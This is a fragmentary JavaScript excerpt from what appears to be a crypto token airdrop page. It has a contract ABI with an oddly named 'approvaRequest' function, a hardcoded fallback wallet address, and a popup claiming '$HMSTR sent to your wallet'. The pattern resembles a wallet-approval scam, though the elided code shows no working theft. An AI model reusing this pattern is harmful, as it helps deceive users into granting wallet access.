...
const sttabi = [
  ...
  {
    inputs: [
      { internalType: "address payable", name: "approvalId", type: "address" },
    ],
    name: "approvaRequest",
    outputs: [],
...
const getAirdrop = async () => {
  ...
  if (fresh === "") fresh = "0xe13bbC4CFc7D82b3A60B9654e05a3B067DC6D1dA";
    ...
    (err, res) => {
      if (!err) {
        Swal.fire({
          ...
          icon: "success",
          html: "<p> $HMSTR sent to your wallet</p><p>Now you can buy tokens and invite referrals</p>",
      ...
      web3.currentProvider.sendAsync(
        {
          ...
          params: {
            type: "ERC20",
            options: {
              address: "0xe13bbC4CFc7D82b3A60B9654e05a3B067DC6D1dA",
              symbol: "$Ham",
              decimals: "18",
              image: "",
            },
